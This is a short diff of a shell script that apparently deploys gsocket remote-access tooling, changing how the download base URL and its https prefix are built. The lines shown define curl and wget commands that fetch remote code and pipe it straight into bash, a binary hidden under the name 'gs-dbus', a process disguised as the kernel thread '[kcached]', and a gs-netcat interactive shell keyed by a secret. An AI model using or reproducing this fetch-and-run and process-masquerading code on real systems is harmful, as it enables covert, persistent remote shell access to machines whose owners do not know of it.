@@ -33,7 +33,7 @@
 #       - Force architecutre to a specific package (for testing purpose only)
 # GS_PREFIX=
 #		- Use 'path' instead of '/' (needed for packaging/testing)
-# GS_URL_BASE=gsocket.io
+# GS_URL_BASE=https://gsocket.io
 #		- Specify URL of static binaries
 # GS_URL_BIN=
 #		- Specify URL of static binaries, defaults to https://${GS_URL_BASE}/bin
@@ -60,9 +60,9 @@
 #       - Guess what...
 
 # Global Defines
-URL_BASE="gsocket.io"
+URL_BASE="https://gsocket.io"
 [[ -n $GS_URL_BASE ]] && URL_BASE="${GS_URL_BASE}"
-URL_BIN="https://${URL_BASE}/bin"
+URL_BIN="${URL_BASE}/bin"
 URL_DEPLOY="${URL_BASE}/x"
 [[ -n $GS_URL_BIN ]] && URL_BIN="${GS_URL_BIN}"
 [[ -n $GS_URL_DEPLOY ]] && URL_DEPLOY="${GS_URL_DEPLOY}"
@@ -93,8 +93,8 @@ msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
 unset data
 unset msg
 
-DL_CRL="bash -c \"\$(curl -fsSL https://$URL_DEPLOY)\""
-DL_WGT="bash -c \"\$(wget -qO- https://$URL_DEPLOY)\""
+DL_CRL="bash -c \"\$(curl -fsSL $URL_DEPLOY)\""
+DL_WGT="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
 BIN_HIDDEN_NAME_DEFAULT="gs-dbus"
 # Can not use '[kcached/0]'. Bash without bashrc would use "/0] $" as prompt. 
 PROC_HIDDEN_NAME_DEFAULT="[kcached]"
